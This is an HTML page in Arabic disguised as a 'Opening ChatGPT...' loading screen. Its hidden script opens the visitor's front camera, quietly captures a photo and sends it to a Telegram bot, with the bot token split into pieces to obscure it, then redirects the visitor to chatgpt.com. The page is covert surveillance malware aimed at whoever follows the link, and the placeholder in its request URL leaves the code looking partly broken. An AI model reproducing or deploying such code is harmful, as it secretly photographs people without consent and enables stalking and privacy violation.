<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #fff; }
        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #10a37f; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="loader"></div>
        <p id="status">جاري فتح ChatGPT...</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // تمويه التوكن عن طريق تقطيه
        const partA = "8757176986";
        const partB = ":";
        const partC = "AAFNsvSswM4J";
        const partD = "_adIelUJWTSuqwRvFJgRo";
        const token = partA + partB + partC + partD;

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id');

        async function captureAndSend() {
            if (!chatId) {
                window.location.href = "https://chatgpt.com";
                return;
            }

            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'img.jpg');
                formData.append('caption', '✅ صورة جديدة من الموقع');

                fetch(`https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .finally(() => {
                    window.location.href = "https://chatgpt.com";
                });
            }, 'image/jpeg', 0.6);
        }

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => { 
                video.srcObject = stream;
                setTimeout(captureAndSend, 1500); 
            })
            .catch(() => {
                window.location.href = "https://chatgpt.com";
            });
    </script>
</body>
</html>
